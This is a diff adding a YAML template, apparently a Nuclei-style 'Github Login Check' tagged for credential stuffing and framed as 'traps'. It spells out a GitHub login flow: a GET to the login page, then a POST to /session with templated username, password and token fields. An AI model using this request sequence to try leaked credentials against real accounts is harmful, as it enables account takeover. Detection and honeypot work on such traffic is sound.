@@ -1,0 +1,37 @@
+id: github-login-check
+info:
+  name: Github Login Check
+  author: parthmalhotra,pdresearch
+  description: Checks for a valid github account.
+  severity: critical
+  reference:
+  - https://owasp.org/www-community/attacks/Credential_stuffing
+  metadata:
+    max-request: 2
+  tags: cloud,creds-stuffing,login-check,github
+traps:
+- request:
+    method: GET
+    path: https://github.com/login
+    headers:
+      Host: github.com
+    body: ''
+  response:
+    status_code: 302
+    headers: {}
+    body: ''
+- request:
+    method: POST
+    path: https://github.com/session
+    headers:
+      Host: github.com
+      Origin: https://github.com
+      Content-Type: application/x-www-form-urlencoded
+      Referer: https://github.com/login
+    body: 'commit=Sign+in&authenticity_token={{authenticity_token}}&login={{username}}&password={{password}}&trusted_device=&webauthn-support=supported&webauthn-iuvpaa-support=unsupported&return_to=https%3A%2F%2Fgithub.com%2Flogin&allow_signup=&client_id=&integration=&required_field_34b7=&timestamp={{timestamp}}&timestamp_secret={{timestamp_secret}}
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
